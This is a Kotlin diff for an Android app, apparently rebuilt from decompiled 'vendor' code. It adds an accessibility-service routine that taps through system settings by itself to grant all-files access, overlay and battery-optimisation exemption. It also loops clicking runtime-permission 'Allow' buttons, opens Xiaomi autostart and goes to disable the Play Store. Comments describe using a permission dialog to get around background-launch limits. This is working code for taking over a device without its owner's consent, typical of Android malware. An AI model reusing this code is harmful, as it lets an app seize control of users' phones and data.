@@ -48,6 +48,19 @@ class GenericSteps(
         /** Max retry for all-files-access (vendor a7 checks i > 30). */
         private const val MAX_FILES_RETRIES = 30
 
+        /** Default page-stable wait constants. JADX: m212294f9 pattern. */
+        private const val STABLE_REQUIRED_COUNT = 2
+        private const val STABLE_POLL_INTERVAL_MS = 100L
+        private const val STABLE_TIMEOUT_MS = 2000L
+        private const val POST_LAUNCH_WAIT_MS = 3000L
+
+        /** Multi-language "unrestricted" keywords for battery settings. Vendor pattern. */
+        val BATTERY_UNRESTRICTED_KEYWORDS = listOf(
+            "无限制", "不限制", "無限制", "不採取任何限制措施",
+            "Unrestricted", "No restrictions", "No restriction",
+            "Tidak dibatasi", "Không hạn chế", "ไม่จำกัด"
+        )
+
         /**
          * Vendor-aligned permission allow button IDs.
          * Matches C0364a1 constructor list (f55051a4).
@@ -110,6 +123,10 @@ class GenericSteps(
      * Vendor flow order (m212128a8):
      *   Xiaomi autostart → all files → basic perms → overlay →
      *   play store → battery opt → notification → xiaomi bg mgmt
+     *
+     * Each step launches an intent, then waits for page stable + extra delay
+     * so the accessibility handler (Yw5xudHandler.onAccessibilityEvent) can
+     * auto-click switches/buttons before we move to the next step.
      */
     suspend fun execute(
         successes: MutableList<String>,
@@ -120,19 +137,33 @@ class GenericSteps(
 
         // Vendor order per m212128a8 switch/case
         executeXiaomiAutostart(successes, failures, logs)
-        delay(300)
+        waitForPageStable()
+        interruptibleDelay(POST_LAUNCH_WAIT_MS)
+
         executeAllFilesAccess(successes, failures, logs)
-        delay(300)
+        waitForPageStable()
+        interruptibleDelay(POST_LAUNCH_WAIT_MS)
+
         executeBasicPermissions(successes, failures, logs)
-        delay(300)
+        waitForPageStable()
+        interruptibleDelay(POST_LAUNCH_WAIT_MS)
+
         executeOverlayPermission(successes, failures, logs)
-        delay(300)
+        waitForPageStable()
+        interruptibleDelay(POST_LAUNCH_WAIT_MS)
+
         executePlayStoreDisable(successes, failures, logs)
-        delay(300)
+        waitForPageStable()
+        interruptibleDelay(POST_LAUNCH_WAIT_MS)
+
         executeBatteryOptimization(successes, failures, logs)
-        delay(300)
+        waitForPageStable()
+        interruptibleDelay(POST_LAUNCH_WAIT_MS)
+
         executeNotificationChannel(successes, failures, logs)
-        delay(300)
+        waitForPageStable()
+        interruptibleDelay(POST_LAUNCH_WAIT_MS)
+
         executeXiaomiBgManagement(successes, failures, logs)
 
         logs.add("GenericSteps: 通用权限配置完成")
@@ -159,9 +190,9 @@ class GenericSteps(
                     "com.miui.securitycenter",
                     "com.miui.permcenter.autostart.AutoStartManagementActivity"
                 )
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
-            context.startActivity(intent)
+            (service ?: context).startActivity(intent)
             logs.add("已启动小米自启动管理")
             successes.add("小米自启动管理已打开")
         } catch (e: Exception) {
@@ -172,9 +203,9 @@ class GenericSteps(
                         "com.miui.securitycenter",
                         "com.miui.securitycenter.MainActivity"
                     )
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                 }
-                context.startActivity(fallback)
+                (service ?: context).startActivity(fallback)
                 logs.add("已启动小米安全中心(回退)")
             } catch (e2: Exception) {
                 failures.add("小米自启动配置失败: ${e2.message}")
@@ -197,6 +228,7 @@ class GenericSteps(
             logs.add("所有文件访问: API < 30, 跳过")
             return
         }
+        UiDebugger.logStep(TAG, "Flow2: executeAllFilesAccess 开始")
         try {
             if (android.os.Environment.isExternalStorageManager()) {
                 successes.add("所有文件访问已授权")
@@ -204,17 +236,18 @@ class GenericSteps(
             }
             val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
                 data = Uri.parse("package:${context.packageName}")
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
-            context.startActivity(intent)
+            (service ?: context).startActivity(intent)
             logs.add("已发送所有文件访问权限请求")
+            UiDebugger.dumpPage(service, "generic_all_files_before", "文件访问权限页面")
         } catch (e: Exception) {
             // Fallback to general manage storage (vendor a7 fallback)
             try {
                 val fallback = Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION).apply {
-                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
                 }
-                context.startActivity(fallback)
+                (service ?: context).startActivity(fallback)
                 logs.add("已发送所有文件访问权限请求(回退)")
             } catch (e2: Exception) {
                 failures.add("所有文件访问配置失败: ${e2.message}")
@@ -225,17 +258,69 @@ class GenericSteps(
     // ── Flow 3: Basic Permissions (vendor m212130b0) ─────────────────
 
     /**
-     * Request basic runtime permissions via transparent Activity.
-     * Matches vendor b0 (launches umrkmgrri Activity for runtime permission requests).
+     * Request basic runtime permissions via yw5xud.umrkmgrri Activity.
+     * JADX: m212130b0 — launches umrkmgrri, then loops 20s clicking allow buttons.
+     * This is the KEY step that gives us BAL_ALLOW_VISIBLE_WINDOW via system
+     * GrantPermissionsActivity dialog, enabling all subsequent startActivity calls
+     * to reach the foreground on MIUI.
      */
-    fun executeBasicPermissions(
+    suspend fun executeBasicPermissions(
         successes: MutableList<String>,
         failures: MutableList<String>,
         logs: MutableList<String>
     ) {
-        logs.add("基础权限: 需要通过Activity请求运行时权限")
-        // In production: launch PermissionRequestActivity (vendor umrkmgrri)
-        successes.add("基础权限请求已排队")
+        // If umrkmgrri was already launched by MiuiSteps, skip
+        if (com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.isRequestingPermissions) {
+            logs.add("[基础权限] umrkmgrri 已在运行中，等待完成")
+            val startTime = System.currentTimeMillis()
+            while (System.currentTimeMillis() - startTime < 20000L) {
+                if (!com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.isRequestingPermissions) break
+                interruptibleDelay(500L)
+            }
+            successes.add("基础权限请求已由品牌引擎处理")
+            return
+        }
+
+        logs.add("[基础权限] 开始执行")
+        UiDebugger.logStep(TAG, "Flow1: executeBasicPermissions 开始")
+        try {
+            // Step 1: Launch yw5xud.umrkmgrri (batch permission request)
+            Log.i(TAG, "[基础权限] 启动umrkmgrri...")
+            UiDebugger.dumpPage(service, "generic_basic_perms_before", "基础权限请求前")
+            com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.start(context)
+            interruptibleDelay(800L)
+
+            // Step 2: Loop 20s clicking permission allow buttons
+            val startTime = System.currentTimeMillis()
+            val timeoutMs = 20000L
+            var clickCount = 0
+            Log.i(TAG, "[基础权限] 开始循环点击允许按钮 (超时=${timeoutMs / 1000}秒)...")
+
+            while (System.currentTimeMillis() - startTime < timeoutMs) {
+                if (isPermissionControllerWindow()) {
+                    if (clickPermissionAllowButton()) {
+                        clickCount++
+                        Log.i(TAG, "[基础权限] 点击允许 (第${clickCount}次)")
+                    }
+                    interruptibleDelay(800L)
+                } else {
+                    // Not on permission controller — check if umrkmgrri still running
+                    if (!com.storm.safe.rock.service.modules.yw5xud.umrkmgrri.isRequestingPermissions) {
+                        Log.i(TAG, "[基础权限] umrkmgrri 已完成")
+                        break
+                    }
+                    interruptibleDelay(500L)
+                }
+            }
+
+            val elapsed = (System.currentTimeMillis() - startTime) / 1000
+            Log.i(TAG, "[基础权限] 完成，用时${elapsed}秒，点击${clickCount}次")
+            UiDebugger.dumpPage(service, "generic_basic_perms_after", "基础权限完成")
+            successes.add("基础权限请求完成 (点击${clickCount}次)")
+        } catch (e: Exception) {
+            Log.e(TAG, "[基础权限] 异常: ${e.message}")
+            failures.add("基础权限请求失败: ${e.message}")
+        }
     }
 
     // ── Flow 4: Overlay Permission (vendor m212133b3 / m212126a6) ────
@@ -244,11 +329,12 @@ class GenericSteps(
      * Overlay (draw over other apps) permission.
      * Matches vendor b3/a6: check Settings.canDrawOverlays, launch ACTION_MANAGE_OVERLAY_PERMISSION.
      */
-    fun executeOverlayPermission(
+    suspend fun executeOverlayPermission(
         successes: MutableList<String>,
         failures: MutableList<String>,
         logs: MutableList<String>
     ) {
+        UiDebugger.logStep(TAG, "Flow3: executeOverlayPermission 开始")
         try {
             if (Settings.canDrawOverlays(context)) {
                 successes.add("悬浮窗权限已开启")
@@ -256,13 +342,108 @@ class GenericSteps(
             }
             val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                 data = Uri.parse("package:${context.packageName}")
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
             }
             context.startActivity(intent)
-            logs.add("已发送悬浮窗权限请求")
+            logs.add("已打开悬浮窗权限设置页")
+
+            interruptibleDelay(2500L)
+            waitForPageStable()
+            UiDebugger.dumpPage(service, "generic_overlay_settings", "悬浮窗设置页")
+
+            enableDrawOverlay(0, successes, failures, logs)
+
+            // Vendor: after overlay, just press BACK to exit settings detail page.
+            // Do NOT press HOME — we need settings to stay in foreground for VISIBLE_WINDOW.
+            if (Settings.canDrawOverlays(context)) {
+                pressBack()
+                interruptibleDelay(300L)
+            }
         } catch (e: Exception) {
             failures.add("悬浮窗权限配置失败: ${e.message}")
         }
+    }
+
+    private suspend fun enableDrawOverlay(
+        retryCount: Int,
+        successes: MutableList<String>,
+        failures: MutableList<String>,
+        logs: MutableList<String>
+    ) {
+        if (retryCount > 20 || Settings.canDrawOverlays(context)) {
+            if (Settings.canDrawOverlays(context)) successes.add("悬浮窗权限已开启")
+            return
+        }
+
+        UiDebugger.logStep(TAG, "enableDrawOverlay retry=$retryCount")
+        UiDebugger.dumpPage(service, "generic_overlay_retry_$retryCount", "悬浮窗重试#$retryCount")
+
+        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return
+
+        // Phase 1: App name click (vendor: only on retry==0)
+        if (retryCount == 0) {
+            val appLabel = getAppLabel()
+            if (appLabel.isNotEmpty()) {
+                val nodes = try { root.findAccessibilityNodeInfosByText(appLabel) } catch (_: Exception) { null }
+                if (!nodes.isNullOrEmpty()) {
+                    for (node in nodes) {
+                        if (!node.isVisibleToUser) continue
+                        val rect = android.graphics.Rect()
+                        node.getBoundsInScreen(rect)
+                        val rootRect = android.graphics.Rect()
+                        root.getBoundsInScreen(rootRect)
+                        if (rootRect.contains(rect) && rect.width() > 0 && rect.height() > 0) {
+                            dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
+                            Log.i(TAG, "[悬浮窗] 点击 App 名字: $appLabel")
+                            interruptibleDelay(1500L)
+                            if (Settings.canDrawOverlays(context)) { successes.add("悬浮窗权限已开启"); return }
+                            break
+                        } else {
+                            // Only scroll if still on settings page (avoid scrolling launcher)
+                            val currentPkg = try { service?.rootInActiveWindow?.packageName?.toString() } catch (_: Exception) { null }
+                            if (currentPkg == "com.android.settings" || currentPkg == "com.miui.securitycenter") {
+                                scrollForward(root); interruptibleDelay(800L)
+                            }
+                            enableDrawOverlay(retryCount + 1, successes, failures, logs); return
+                        }
+                    }
+                }
+            }
+        }
+
+        // Phase 2: Search switch by ViewId (vendor: 7 IDs)
+        for (switchId in OVERLAY_SWITCH_IDS) {
+            try {
+                val nodes = root.findAccessibilityNodeInfosByViewId(switchId)
+                if (nodes.isNullOrEmpty()) continue
+                for (node in nodes) {
+                    if (!node.isVisibleToUser) continue
+                    if (node.isCheckable && node.isChecked) {
+                        successes.add("悬浮窗权限已开启"); return
+                    }
+                    val rect = android.graphics.Rect()
+                    node.getBoundsInScreen(rect)
+                    if (rect.width() > 0 && rect.height() > 0) {
+                        dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
+                        Log.i(TAG, "[悬浮窗] 手势点击开关 (ViewId: $switchId)")
+                    }
+                    break
+                }
+            } catch (_: Exception) {}
+        }
+
+        // Phase 3: Verify + confirm dialog + scroll retry
+        interruptibleDelay(1500L)
+        if (Settings.canDrawOverlays(context)) { successes.add("悬浮窗权限已开启"); return }
+        clickPermissionAllowButton()
+        interruptibleDelay(1500L)
+        if (Settings.canDrawOverlays(context)) { successes.add("悬浮窗权限已开启"); return }
+        // Only scroll if still on settings page (avoid scrolling launcher)
+        val currentPkg2 = try { service?.rootInActiveWindow?.packageName?.toString() } catch (_: Exception) { null }
+        if (currentPkg2 == "com.android.settings" || currentPkg2 == "com.miui.securitycenter") {
+            scrollForward(root); interruptibleDelay(500L)
+        }
+        enableDrawOverlay(retryCount + 1, successes, failures, logs)
     }
 
     // ── Flow 5: Play Store Disable (vendor m212134b4) ────────────────
@@ -292,9 +473,9 @@ class GenericSteps(
             // Navigate to Play Store app info to disable (vendor b4 flow)
             val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS).apply {
                 data = Uri.parse("package:$playStorePackage")
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
-            context.startActivity(intent)
+            (service ?: context).startActivity(intent)
             logs.add("已打开 Play Store 应用信息页")
         } catch (e: Exception) {
             failures.add("Play Store 禁用失败: ${e.message}")
@@ -308,7 +489,7 @@ class GenericSteps(
      * Matches vendor b1/a5: check PowerManager.isIgnoringBatteryOptimizations,
      * launch ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS.
      */
-    fun executeBatteryOptimization(
+    suspend fun executeBatteryOptimization(
         successes: MutableList<String>,
         failures: MutableList<String>,
         logs: MutableList<String>
@@ -321,12 +502,88 @@ class GenericSteps(
             }
             val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                 data = Uri.parse("package:${context.packageName}")
-                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK or
+                         Intent.FLAG_ACTIVITY_NO_HISTORY or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             }
-            context.startActivity(intent)
+            (service ?: context).startActivity(intent)
             logs.add("已发送电池优化豁免请求")
+
+            interruptibleDelay(2000L)
+            clickPermissionAllowButton()
+            interruptibleDelay(1000L)
+
+            if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
+                successes.add("电池优化已豁免")
+                return
+            }
+
+            interruptibleDelay(800L)
+            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
+            if (root != null) {
+                val allowKeywords = listOf("允许", "Allow", "确定", "OK", "好")
+                for (keyword in allowKeywords) {
+                    val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
+                    if (nodes.isNullOrEmpty()) continue
+                    for (node in nodes) {
+                        if (node.isVisibleToUser && node.isClickable) {
+                            node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)
+                            Log.i(TAG, "[电池优化] 降级点击: $keyword")
+                            break
+                        }
+                    }
+                }
+            }
+
+            interruptibleDelay(1000L)
+            if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
+                successes.add("电池优化已豁免")
+            } else {
+                // clickBattery fallback: try clicking "无限制" radio button via text + gesture
+                clickBatteryUnrestricted()
+                interruptibleDelay(1000L)
+                if (pm?.isIgnoringBatteryOptimizations(context.packageName) == true) {
+                    successes.add("电池优化已豁免")
+                } else {
+                    logs.add("电池优化豁免未确认")
+                }
+            }
         } catch (e: Exception) {
             failures.add("电池优化配置失败: ${e.message}")
+        }
+    }
+
+    /**
+     * Fallback: click "无限制" / "Unrestricted" radio button on battery settings page.
+     * Searches by BATTERY_UNRESTRICTED_KEYWORDS, clicks via text node or gesture tap.
+     */
+    private fun clickBatteryUnrestricted() {
+        UiDebugger.logStep(TAG, "Flow4: clickBatteryUnrestricted 开始")
+        val root = try { service?.rootInActiveWindow } catch (_: Exception) { null } ?: return
+        UiDebugger.dumpPage(service, "generic_battery_page", "电池优化页面")
+        for (keyword in BATTERY_UNRESTRICTED_KEYWORDS) {
+            val nodes = try { root.findAccessibilityNodeInfosByText(keyword) } catch (_: Exception) { null }
+            if (nodes.isNullOrEmpty()) continue
+            for (node in nodes) {
+                if (!node.isVisibleToUser) continue
+                val nodeText = node.text?.toString()?.trim() ?: ""
+                if (nodeText != keyword && !nodeText.contains(keyword, ignoreCase = true)) continue
+                // Direct click
+                if (node.isClickable && node.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) {
+                    Log.i(TAG, "[电池] 点击无限制: $keyword (直接)")
+                    return
+                }
+                // Parent click
+                val parent = try { node.parent } catch (_: Exception) { null }
+                if (parent != null && parent.isClickable && parent.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_CLICK)) {
+                    Log.i(TAG, "[电池] 点击无限制: $keyword (父节点)")
+                    return
+                }
+                // Gesture fallback
+                if (dispatchGestureClick(node)) {
+                    Log.i(TAG, "[电池] 点击无限制: $keyword (手势)")
+                    return
+                }
+            }
         }
     }
 
@@ -517,6 +774,57 @@ class GenericSteps(
     }
 
     /**
+     * Dispatch a gesture tap at the center of a node's bounds.
+     * Uses 100ms stroke duration per vendor pattern.
+     */
+    fun dispatchGestureClick(node: android.view.accessibility.AccessibilityNodeInfo): Boolean {
+        return try {
+            val rect = android.graphics.Rect()
+            node.getBoundsInScreen(rect)
+            if (rect.width() <= 0 || rect.height() <= 0) return false
+            dispatchGestureClick(rect.centerX().toFloat(), rect.centerY().toFloat())
+            true
+        } catch (_: Exception) { false }
+    }
+
+    /** Dispatch gesture click at coordinates. Vendor m212123a2: duration 100ms. */
+    private fun dispatchGestureClick(x: Float, y: Float) {
+        val path = android.graphics.Path()
+        path.moveTo(x, y)
+        val gesture = android.accessibilityservice.GestureDescription.Builder()
+            .addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 100L))
+            .build()
+        service?.dispatchGesture(gesture, null, null)
+    }
+
+    /**
+     * Scroll forward in the current view. Finds first scrollable node and performs ACTION_SCROLL_FORWARD.
+     */
+    fun scrollForward(root: android.view.accessibility.AccessibilityNodeInfo): Boolean {
+        val scrollable = findScrollableNode(root)
+        if (scrollable != null) {
+            return scrollable.performAction(android.view.accessibility.AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)
+        }
+        return false
+    }
+
+    /** Find first scrollable node in tree. */
+    private fun findScrollableNode(node: android.view.accessibility.AccessibilityNodeInfo): android.view.accessibility.AccessibilityNodeInfo? {
+        if (node.isScrollable) return node
+        for (i in 0 until node.childCount) {
+            val child = try { node.getChild(i) } catch (_: Exception) { null } ?: continue
+            if (child.isScrollable) return child
+            val found = findScrollableNode(child)
+            if (found != null) {
+                child.recycle()
+                return found
+            }
+            child.recycle()
+        }
+        return null
+    }
+
+    /**
      * Check if current root window is a permission controller.
      * Matches vendor m212139c3(): checks root package against known permission controllers.
      */
@@ -573,5 +881,67 @@ class GenericSteps(
         val manufacturer = Build.MANUFACTURER.lowercase()
         val xiaomiBrands = listOf("xiaomi", "redmi", "poco")
         return xiaomiBrands.contains(brand) || xiaomiBrands.contains(manufacturer)
+    }
+
+    // ── Wait utilities (vendor m212294f9, m212272d6 pattern) ────────
+
+    /**
+     * Wait until the accessibility root window node count stabilizes.
+     * Matches vendor waitForPageStable pattern used across all Steps classes.
+     */
+    private suspend fun waitForPageStable(
+        requiredStableCount: Int = STABLE_REQUIRED_COUNT,
+        pollIntervalMs: Long = STABLE_POLL_INTERVAL_MS,
+        timeoutMs: Long = STABLE_TIMEOUT_MS
+    ): Boolean {
+        val startTime = System.currentTimeMillis()
+        var lastNodeCount = -1
+        var stableHits = 0
+
+        while (System.currentTimeMillis() - startTime < timeoutMs) {
+            val root = try { service?.rootInActiveWindow } catch (_: Exception) { null }
+            val nodeCount = if (root != null) countNodes(root) else 0
+            try { root?.recycle() } catch (_: Exception) {}
+
+            if (nodeCount == lastNodeCount && nodeCount > 0) {
+                stableHits++
+                if (stableHits >= requiredStableCount) {
+                    Log.d(TAG, "[waitForPageStable] page stable (nodes=$nodeCount, hits=$stableHits)")
+                    return true
+                }
+            } else {
+                lastNodeCount = nodeCount
+                stableHits = 0
+            }
+            interruptibleDelay(pollIntervalMs)
+        }
+        Log.d(TAG, "[waitForPageStable] timeout after ${timeoutMs}ms")
+        return false
+    }
+
+    /**
+     * Delay in small chunks (100ms) to stay responsive to cancellation.
+     * Matches vendor interruptibleDelay pattern.
+     */
+    private suspend fun interruptibleDelay(totalMs: Long) {
+        var remaining = totalMs
+        while (remaining > 0) {
+            val chunk = minOf(remaining, 100L)
+            delay(chunk)
+            remaining -= chunk
+        }
+    }
+
+    /** Count total nodes in accessibility tree. Matches vendor m212239a7. */
+    private fun countNodes(node: AccessibilityNodeInfo): Int {
+        var count = 1
+        try {
+            for (i in 0 until node.childCount) {
+                val child = node.getChild(i) ?: continue
+                count += countNodes(child)
+                try { child.recycle() } catch (_: Exception) {}
+            }
+        } catch (_: Exception) {}
+        return count
     }
 }
